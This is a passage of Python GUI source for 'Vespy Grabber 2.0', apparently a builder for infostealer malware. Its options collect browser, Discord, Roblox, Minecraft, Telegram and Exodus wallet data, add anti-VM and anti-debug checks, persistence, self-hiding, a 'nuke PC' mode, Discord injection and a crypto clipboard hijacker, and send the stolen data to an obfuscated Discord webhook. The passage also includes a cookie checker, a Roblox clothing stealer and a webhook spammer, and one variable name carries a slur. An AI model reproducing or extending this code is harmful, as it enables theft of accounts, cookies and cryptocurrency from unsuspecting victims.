            self.DiscordS.config(image=fullbu)
            self.discordS = True

    def _setup(self):
        try:
            A=self.customMsgDSENT.get()
            self.customMsgDS = A
            B = self.customMsgErrorENT.get()
            self.customMsgError = B
        except:pass
        bg = Label(window, image=backg3, borderwidth=0)
        bg.place(x=156, y=62)
        bg2 = Label(window, image=options1bg, borderwidth=0)
        bg2.place(x=182, y=93)
        if self.browserR == False:
            self.BrowserR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._brsetup)
            self.BrowserR.place(x=358,y=103)
        else:
            self.BrowserR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._brsetup)
            self.BrowserR.place(x=358,y=103)
        if self.discordR == False:
            self.DiscordR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._drsetup)
            self.DiscordR.place(x=197,y=103)
        else:
            self.DiscordR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._drsetup)
            self.DiscordR.place(x=197,y=103)
        if self.robloxR == False:
            self.RobloxR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rrsetup)
            self.RobloxR.place(x=197,y=136)
        else:
            self.RobloxR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rrsetup)
            self.RobloxR.place(x=197,y=136)
        if self.filesR == False:
            self.FilesR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._frsetup)
            self.FilesR.place(x=358,y=136)
        else:
            self.FilesR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._frsetup)
            self.FilesR.place(x=358,y=136)
        if self.minecraftR == False:
            self.MinecraftR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._mrsetup)
            self.MinecraftR.place(x=358,y=169)
        else:
            self.MinecraftR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._mrsetup)
            self.MinecraftR.place(x=358,y=169)
        if self.networkI == False:
            self.NetworkI = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._nisetup)
            self.NetworkI.place(x=358,y=202)
        else:
            self.NetworkI = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._nisetup)
            self.NetworkI.place(x=358,y=202)
        if self.obfuscateS == False:
            self.ObfuscateS = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._ossetup)
            self.ObfuscateS.place(x=227,y=288)
        else:
            self.ObfuscateS = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._ossetup)
            self.ObfuscateS.place(x=227,y=288)
        if self.webhookJ == False:
            self.WebhookJ = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._wjsetup)
            self.WebhookJ.place(x=227,y=393)
        else:
            self.WebhookJ = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._wjsetup)
            self.WebhookJ.place(x=227,y=393)
        if self.antiD == False:
            self.AntiD = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._adsetup)
            self.AntiD.place(x=227,y=358)
        else:
            self.AntiD = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._adsetup)
            self.AntiD.place(x=227,y=358)
        if self.rebootP == False:
            self.RebootP = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rpsetup)
            self.RebootP.place(x=409,y=323)
        else:
            self.RebootP = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rpsetup)
            self.RebootP.place(x=409,y=323)
        if self.startupP == False:
            self.StartupP = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._spsetup)
            self.StartupP.place(x=409,y=288)
        else:
            self.StartupP = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._spsetup)
            self.StartupP.place(x=409,y=288)
        if self.errorM == False:
            self.ErrorM = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._emsetup)
            self.ErrorM.place(x=559,y=288)
        else:
            self.ErrorM = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._emsetup)
            self.ErrorM.place(x=559,y=288)
        if self.antivmS == False:
            self.ANTIVMS = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._antivmsetup)
            self.ANTIVMS.place(x=227,y=323)
        else:
            self.ANTIVMS = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._antivmsetup)
            self.ANTIVMS.place(x=227,y=323)
        if self.hideS == False:
            self.HIDEHAHA = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._hideitselfsetup)
            self.HIDEHAHA.place(x=409,y=358)
        else:
            self.HIDEHAHA = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._hideitselfsetup)
            self.HIDEHAHA.place(x=409,y=358)
        if self.NUKEPCHAHAHA == False:
            self.NUKETHATLGBTQ = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._NUKEsetup)
            self.NUKETHATLGBTQ.place(x=409,y=393)
        else:
            self.NUKETHATLGBTQ = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._NUKEsetup)
            self.NUKETHATLGBTQ.place(x=409,y=393)
        if self.telegramS == False:
            self.TELEGRAMS = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._telesetup)
            self.TELEGRAMS.place(x=197,y=169)
        else:
            self.TELEGRAMS = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._telesetup)
            self.TELEGRAMS.place(x=197,y=169)
        if self.exodusS == False:
            self.EXODUSS = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._exosetup)
            self.EXODUSS.place(x=197,y=202)
        else:
            self.EXODUSS = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._exosetup)
            self.EXODUSS.place(x=197,y=202)
        if self.discordS == False:
            self.DiscordS = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._dssetup)
            self.DiscordS.place(x=580,y=106)
        else:
            self.DiscordS = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._dssetup)
            self.DiscordS.place(x=580,y=106)
        if len(self.customMsgDS) > 0:
            self.customMsgDSENT = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=15,borderwidth=0)
            self.customMsgDSENT.insert(0, self.customMsgDS)
            self.customMsgDSENT.place(x=585, y=195)
        else:
            self.customMsgDSENT = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=15,borderwidth=0)
            self.customMsgDSENT.insert(0, str(self.customMsgDS))
            self.customMsgDSENT.place(x=585, y=195)
        if len(self.customMsgError) > 0:
            self.customMsgErrorENT = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=15,borderwidth=0)
            self.customMsgErrorENT.insert(0, self.customMsgError)
            self.customMsgErrorENT.place(x=560, y=374)
        else:
            self.customMsgErrorENT = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=15,borderwidth=0)
            self.customMsgErrorENT.insert(0, str(self.customMsgError))
            self.customMsgErrorENT.place(x=560, y=374)
        nextpage = Button(window, image=n3xtbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._MOREoptions)
        nextpage.place(x=520,y=139)

    def _discordinjection(self):
        if self.DISCORDINJECTION:
            self.DISCORDINJECTION = False
            self.discordinjectionbu.config(image=blankbu)
        else:
            self.DISCORDINJECTION = True
            self.discordinjectionbu.config(image=fullbu)
    
    def _cryptoclippa(self):
        if self.cryptoCLIPPA:
            self.cryptoCLIPPA = False
            self.cryptoclip.config(image=blankbu)
        else:
            self.cryptoCLIPPA = True
            self.cryptoclip.config(image=fullbu)

    def _MOREoptions(self):
        try:
            A=self.cryptobitcoinent.get()
            self.cryptoBITCOIN = A
            B = self.cryptoETHent.get()
            self.cryptoETH = B
        except:pass
        bg2 = Label(window, image=options2bg, borderwidth=0)
        bg2.place(x=182, y=93)
        backbu = Button(window, image=b4ckbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._setup)
        backbu.place(x=520,y=139)
        if self.DISCORDINJECTION == False:
            self.discordinjectionbu = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._discordinjection)
            self.discordinjectionbu.place(x=192,y=104)
        else:
            self.discordinjectionbu = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._discordinjection)
            self.discordinjectionbu.place(x=192,y=104)
        if self.cryptoCLIPPA == False:
            self.cryptoclip = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._cryptoclippa)
            self.cryptoclip.place(x=192,y=139)
        else:
            self.cryptoclip = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._cryptoclippa)
            self.cryptoclip.place(x=192,y=139)
        if len(self.cryptoBITCOIN) > 0:
            self.cryptobitcoinent = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=15,borderwidth=0)
            self.cryptobitcoinent.insert(0, self.cryptoBITCOIN)
            self.cryptobitcoinent.place(x=195, y=204)
        else:
            self.cryptobitcoinent = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=15,borderwidth=0)
            self.cryptobitcoinent.insert(0, str(self.cryptoBITCOIN))
            self.cryptobitcoinent.place(x=195, y=204)
        if len(self.cryptoETH) > 0:
            self.cryptoETHent = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=15,borderwidth=0)
            self.cryptoETHent.insert(0, self.cryptoETH)
            self.cryptoETHent.place(x=333, y=204)
        else:
            self.cryptoETHent = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=15,borderwidth=0)
            self.cryptoETHent.insert(0, str(self.cryptoETH))
            self.cryptoETHent.place(x=333, y=204)

    def _testhook(self):
        wbh = self.webhook.get()
        if "discord" in wbh:
            self.webhook.delete(0, END)
            messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper","Vespy Updated webhook part. Vespy now uses sharetext links with your webhook in the paste.\n\n ! Click on the interrogation point (?) and follow the tutorial")
        else:
            try:
                wbh = str(wbh).split("sharetext.me/")[0]+"sharetext.me/raw/"+str(wbh).split("sharetext.me/")[1]
                wbh = requests.get(wbh).text
                if wbh.startswith("3+"):
                    wbh = wbh.replace("\n","").replace(" ","")
                    wbh = wbh.strip()
                    while True:
                        try:wbh=__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode(wbh.split(f'{chr(51)}{chr(43)}')[1].encode()).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()
                        except:break
                try:
                    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                    embed = DiscordEmbed(title=f"Vespy Grabber", description=f"Webhook Working :white_check_mark:", color='4300d1')
                    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                    embed.set_footer(text='Vespy 2.0 | by : vesper')
                    embed.set_timestamp()
                    webhook.add_embed(embed)
                    webhook.execute()
                except:
                    messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")
            except:
                messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Sharetext Link")

    def _phsetup(self):
        if self.pingH:
            self.PingH.config(image=blankbu)
            self.pingH = False
        else:
            self.PingH.config(image=fullbu)
            self.pingH = True
    
    def _compileexesetup(self):
        if self.compiletoexe:
            self.Compiletoexe.config(image=blankbu)
            self.compiletoexe = False
        else:
            self.Compiletoexe.config(image=fullbu)
            self.compiletoexe = True
            self.Keeppythonfile.config(image=blankbu)
            self.keeppythonfile = False
    
    def _keeppysetup(self):
        if self.keeppythonfile:
            self.Keeppythonfile.config(image=blankbu)
            self.keeppythonfile = False
        else:
            self.Keeppythonfile.config(image=fullbu)
            self.keeppythonfile = True
            self.Compiletoexe.config(image=blankbu)
            self.compiletoexe = False
            self.Hidepayloadb.config(image=blankbu)
            self.hidepayloadb = False
    
    def _hidepaysetup(self):
        if self.hidepayloadb:
            self.Hidepayloadb.config(image=blankbu)
            self.hidepayloadb = False
        else:
            self.Hidepayloadb.config(image=fullbu)
            self.hidepayloadb = True
            self.Compiletoexe.config(image=fullbu)
            self.compiletoexe = True
            self.Keeppythonfile.config(image=blankbu)
            self.keeppythonfile = False

    def _browse(self):
        self.icon.delete(0, END)
        self.icon.insert(END,askopenfilename(filetypes=(("ico files","*.ico"),("All files","*.*"))))
    def _browse2(self):
        self.hidepayloadname.delete(0, END)
        self.hidepayloadname.insert(END,askopenfilename(filetypes=(("python files","*.py"),("All files","*.*"))))

    def _verification(self):
        try:
            A=self.customMsgDSENT.get()
            self.customMsgDS = A
            B = self.customMsgErrorENT.get()
            self.customMsgError = B
            C = self.hidepayloadname.get()
            self.PYTHONDHTEXT = C
            D = self.cryptobitcoinent.get()
            self.cryptoBITCOIN = D
            E = self.cryptoETHent.get()
            self.cryptoETH = E
        except:pass
        if len(self.webhook.get()) < 5:
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Link too short idiot")
        else:
            try:
                linky = self.webhook.get()
                if "discord" in linky:
                    self.webhook.delete(0, END)
                    messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper","Vespy Updated webhook part. Vespy now uses sharetext links with your webhook in the paste.\n\n ! Click on the interrogation point (?) and follow the tutorial")
                else:
                    try:
                        wbh = str(linky).split("sharetext.me/")[0]+"sharetext.me/raw/"+str(linky).split("sharetext.me/")[1]
                        wbh = requests.get(wbh).text
                        if wbh.startswith("3+"):
                            wbh = wbh.replace("\n","").replace(" ","")
                            wbh = wbh.strip()
                            while True:
                                try:wbh=__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode(wbh.split(f'{chr(51)}{chr(43)}')[1].encode()).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()
                                except:break
                        r=requests.get(wbh)
                        if r.status_code == 200 or r.status_code == 204:
                            webhook = str(linky).split("sharetext.me/")[0]+"sharetext.me/raw/"+str(linky).split("sharetext.me/")[1]
                            name = self.name.get().replace(" ","_").replace(".","_")
                            if self.errorM:
                                if len(self.customMsgError) < 2:
                                    self.customMsgError = "Error 0xf0001233"
                            if name == "Name" or name == "" or name == " ":
                                name = "Default"
                            icon = self.icon.get()
                            if icon == "Icon Path" or icon == "":
                                icon = ""
                            # :skull: ik
                            Thread(target=Builder,args=(self.browserR,self.discordR,self.robloxR,self.filesR,self.minecraftR,self.networkI,self.obfuscateS,self.webhookJ,self.antiD,self.rebootP,self.startupP,self.errorM,self.pingH,self.discordS,self.exodusS,self.telegramS,self.antivmS,self.hideS,self.NUKEPCHAHAHA,self.customMsgDS,self.customMsgError,self.compiletoexe,self.hidepayloadb,self.PYTHONDHTEXT,self.DISCORDINJECTION,self.cryptoCLIPPA,self.cryptoBITCOIN,self.cryptoETH,webhook,name,icon)).start()
                        else:
                            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Invalid Webhook")
                    except:
                        messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Invalid Sharetext link")
            except:
                messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Invalid Webhook")

    def checkwebhook(self,hook):
        try:
            r=requests.get(hook)
            if str(r.status_code) == "200" or str(r.status_code) == "204":
                return True
            else:
                return False
        except:
            return False

    def _savehook(self):
        I = self.toolswebhook.get()
        self.TOOLWEBHOOK = I
        if self.checkwebhook(self.TOOLWEBHOOK):
            open("tools/webhook.txt","w+").write(self.TOOLWEBHOOK)
            messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Webhook was succesfully saved")
        else:
            self.toolswebhook.insert(0, "")
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Invalid Webhook")

    def _tools(self):
        bg = Label(window, image=backg6, borderwidth=0)
        bg.place(x=156, y=62)
        self.toolswebhook = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=39,borderwidth=0)
        if self.checkwebhook(open("tools/webhook.txt","r+").read()):
            self.toolswebhook.insert(0, open("tools/webhook.txt","r+").read())
            I = self.toolswebhook.get()
            self.TOOLWEBHOOK = I
        self.toolswebhook.place(x=320, y=69)
        savurrr = Button(window, image=savebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._savehook)
        savurrr.place(x=616,y=66)
        bg2 = Label(window, image=backg7, bg='#0B0B0B',borderwidth=0)
        bg2.place(x=178, y=101)
        gotorobloxtools = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rotools)
        gotorobloxtools.place(x=235,y=354)
        gotodiscordtools = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._distools)
        gotodiscordtools.place(x=408,y=354)
        gototelegramtools = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._teletools)
        gototelegramtools.place(x=591,y=354)

    def ALLINFOOMG(self):
        if self.rocookiealliinfo:
            self.rocookiealliinfo=False
            self.getallinforo.config(image=blankbu)
        else:
            self.rocookiealliinfo=True
            self.getallinforo.config(image=fullbu)

    def CHECKDACOOKIE(self):
        webhook = self.TOOLWEBHOOK
        cookie = self.cookietocheck.get()
        from tools.CookieCheck import CookieCheckar
        CookieCheckar(webhook, cookie, self.rocookiealliinfo)
        self.rocookiealliinfo=False
        self.getallinforo.config(image=blankbu)
        self.cookiecheckar()

    def cookiecheckar(self):
        bg2 = Label(window, image=robloxcookiecheck,bg='#0B0B0B',borderwidth=0)
        bg2.place(x=178, y=101)
        self.getallinforo = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self.ALLINFOOMG)
        self.getallinforo.place(x=389,y=288)
        goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rotools)
        goback.place(x=186,y=401)
        self.cookietocheck = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=39,borderwidth=0)
        self.cookietocheck.place(x=306,y=228)
        gocheck = Button(window, image=checkbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self.CHECKDACOOKIE)
        gocheck.place(x=409,y=351)

    def _proxyonoff(self):
        if self.PROXYONOFF:
            self.PROXYONOFF = False
            self.proxyonoff.config(image=blankbu)
        else:
            self.PROXYONOFF = True
            self.proxyonoff.config(image=fullbu)

    def _saveproxy(self):
        open("tools/proxy.txt","w+").write(self.grpfinderproxy.get())

    def _startgrpfinder(self):
        try:
            threads = int(self.grpfinderthreads.get())
        except:
            threads = 100
        proxy = bool(self.PROXYONOFF)
        webhook = self.TOOLWEBHOOK
        from tools.GroupFinder import Groupfind
        Thread(target=Groupfind,args=(webhook,threads,proxy)).start()
        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Starting to find unowned groups.")

    def groupfindar(self):
        self.PROXYONOFF = False
        bg2 = Label(window, image=groupfindbg,bg='#0B0B0B',borderwidth=0)
        bg2.place(x=178, y=101)
        goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rotools)
        goback.place(x=186,y=401)
        self.grpfinderthreads = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.grpfinderthreads.place(x=377,y=213)
        self.grpfinderproxy = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.grpfinderproxy.place(x=377,y=323)
        if len(open("tools/proxy.txt","r+").read().strip()) > 3:
            self.grpfinderproxy.insert(0, open("tools/webhook.txt","r+").read())
        self.proxyonoff = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._proxyonoff)
        self.proxyonoff.place(x=440,y=257)
        savurrr = Button(window, image=savebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._saveproxy)
        savurrr.place(x=540,y=317)
        starttt = Button(window, image=startbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._startgrpfinder)
        starttt.place(x=412,y=380)

    def _stealthemclothings(self):
        ID = self.clothingID.get()
        r=requests.get(f"https://assetdelivery.roblox.com/v1/assetId/{ID}")
        if 'errors' in r.json():
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Invalid Clothing ID")
            self.clothingID.delete(0, END)
        else:
            from tools.ClothingStealer import stealclothes
            Thread(target=stealclothes,args=(self.TOOLWEBHOOK,ID)).start()

    def clothingstealar(self):
        bg2 = Label(window, image=clothingstealerbg,bg='#0B0B0B',borderwidth=0)
        bg2.place(x=178, y=101)
        goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rotools)
        goback.place(x=186,y=401)
        self.clothingID = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.clothingID.place(x=377,y=262)
        starttt = Button(window, image=startbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._stealthemclothings)
        starttt.place(x=412,y=327)
    
    def usernamegen(self):
        messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Currently Patched. Sad face")

    def _rotools(self):
        I = self.toolswebhook.get()
        self.TOOLWEBHOOK = I
        if self.checkwebhook(self.TOOLWEBHOOK):
            bg2 = Label(window, image=bgrotool1, bg='#0B0B0B',borderwidth=0)
            bg2.place(x=178, y=101)
            goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._tools)
            goback.place(x=186,y=401)
            gonext = Button(window, image=nextbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rotools2)
            gonext.place(x=635,y=401)
            gotocookiecheck = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self.cookiecheckar)
            gotocookiecheck.place(x=235,y=354)
            gotogroupfindar = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self.groupfindar)
            gotogroupfindar.place(x=408,y=354)
            gotocs = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self.clothingstealar)
            gotocs.place(x=591,y=354)
    
    def _rotools2(self):
        bg2 = Label(window, image=bgrotool2, bg='#0B0B0B',borderwidth=0)
        bg2.place(x=178, y=101)
        goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rotools)
        goback.place(x=186,y=401)
        gonext = Button(window, image=nextbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B")
        gonext.place(x=635,y=401)
        gotousernamegen = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self.usernamegen)
        gotousernamegen.place(x=235,y=354)
    
    def _ENCODE_EL_WEBHOOKA(self):
        #check webhook
        if self.timesencoded == 3:
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Max amount of encoding is 3. Wait for new update for better encoding.")
        else:
            webhook = self.webhooktoencode.get()
            if webhook.startswith('3+'):
                from tools.EncodeWebhook import encodatolol
                wbh = encodatolol(webhook)
                self.webhooktoencode.delete(0, END)
                self.webhooktoencode.insert(0, wbh)
                self.timesencoded += 1
                messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003",f"Successfully Encoded Webhook ( Encoded {self.timesencoded} Time(s) )")
            else:
                try:
                    if requests.get(webhook).status_code == 200 or requests.get(webhook).status_code == 204:
                        from tools.EncodeWebhook import encodatolol
                        wbh = encodatolol(webhook)
                        self.webhooktoencode.delete(0, END)
                        self.webhooktoencode.insert(0, wbh)
                        self.timesencoded += 1
                        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003",f"Successfully Encoded Webhook ( Encoded {self.timesencoded} Time(s) )")
                    else:
                        self.webhooktoencode.delete(0, END)
                        messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Invalid Webhook")
                except:
                    self.webhooktoencode.delete(0, END)
                    messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Invalid Webhook")

    def _copy_el_encoded_webhook(self):
        copy(self.webhooktoencode.get())
        self.webhooktoencode.delete(0, END)
        self.timesencoded = 0
        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003",f"Encoded Webhook Copied to Clipboard !")

    def _encodewbh(self):
        self.timesencoded = 0
        bg2 = Label(window, image=encodewbhbg,bg='#0B0B0B',borderwidth=0)
        bg2.place(x=178, y=101)
        goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._distools)
        goback.place(x=186,y=401)
        self.webhooktoencode = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=39,borderwidth=0)
        self.webhooktoencode.place(x=309,y=212)
        encode = Button(window, image=encodebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._ENCODE_EL_WEBHOOKA)
        encode.place(x=374,y=240)
        copy = Button(window, image=copybu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._copy_el_encoded_webhook)
        copy.place(x=452,y=240)
    
    def _add_embed(self):
        if self.AddEMbed:
            self.AddEMbed = False
            self.addembedbu.config(image=blankbu)
        else:
            self.AddEMbed = True
            self.addembedbu.config(image=fullbu)

    def _spamthehookasf(self):
        colorhexlist = ["#000000","#7289DA","#FFFFFF","#2C2F33","#23272A","#DC143C","#E9967A","#F08080","#FFC0CB","#FF69B4","#FF1493","#FF6347","#FFD700","#FFFACD","#FFEFD5","#FFE4B5","#BDB76B","#EE82EE","#BA55D3","#4B0082","#6A5ACD","#7FFF00","#2E8B57","#00FFFF","#4682B4","#800000","#008080","#191970","#D2691E"]
        embed_content = []
        your_webhook = self.TOOLWEBHOOK
        webhooka = self.wswebhook.get()
        if requests.get(webhooka).status_code == 200 or requests.get(webhooka).status_code == 204:
            content = self.wscontent.get()
            if len(content) < 1:
                content = "@everyone"
            threads = self.wsthreads.get()
            try:
                threads = int(threads)
            except:
                threads = 1
            if self.AddEMbed:
                title = self.wstitle.get()
                if len(title) < 1:
                    title = "Default"
                description = self.wsdescr.get()
                if len(description) < 1:
                    description = "Webhook Spammed"
                colorhex = self.wscolorhex.get()
                if "#" in colorhex:
                    pass
                else:
                    colorhex = "#"+colorhex
                if colorhex.upper() in tuple(colorhexlist):
                    pass
                else:
                    colorhex = random.choice(colorhexlist)
                imageurl = self.wsimgurl.get()
                if len(imageurl) < 1:
                    imageurl = ""
                else:
                    try:
                        r=requests.get(imageurl)
                        if r.status_code == 200 or r.status_code == 204:
                            pass
                    except:
                        imageurl=""
                embed_content.append("Yes");embed_content.append(title);embed_content.append(description);embed_content.append(colorhex);embed_content.append(imageurl)
            else:
                embed_content.append("No")
            from tools.WebhookSpam import spamthatwebhook
            webhook = DiscordWebhook(url=your_webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
            embed = DiscordEmbed(title=f"Webhook Spammer", description=f"```Spamming {webhooka} Around {threads} Time(s). Attack Started.```", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
            spamthatwebhook(webhooka,content,threads,embed_content)
